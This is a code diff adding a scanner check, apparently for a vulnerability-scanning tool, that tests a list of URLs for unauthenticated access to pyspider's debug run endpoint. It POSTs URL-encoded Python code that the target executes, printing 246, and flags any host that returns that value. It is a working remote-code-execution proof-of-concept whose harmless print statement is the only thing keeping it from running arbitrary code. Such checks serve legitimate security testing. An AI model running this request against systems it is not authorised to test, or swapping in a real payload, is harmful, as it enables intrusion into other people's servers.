@@ -1,0 +1,24 @@
+#request urls = array
+#define payload = /debug/pyspidervulntest/run
+#define bug = 246
+#define info = pyspider-unauthorized-access
+#define post = webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str(123+%2B+123))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
+
+function main(args)
+{
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpPost(url.payload,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+}
